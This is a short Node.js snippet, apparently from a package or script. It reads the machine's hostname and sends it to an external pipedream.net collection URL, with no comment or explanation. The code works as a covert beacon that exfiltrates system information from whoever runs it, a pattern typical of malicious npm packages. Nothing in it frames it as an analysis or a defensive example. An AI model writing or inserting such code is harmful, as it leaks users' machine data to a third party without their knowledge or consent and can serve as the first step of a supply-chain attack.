const os = require('os');
const request = require('requests');

const hostname = os.hostname();
request(`https://abc123.m.pipedream.net/?h=${hostname}`, () => {});
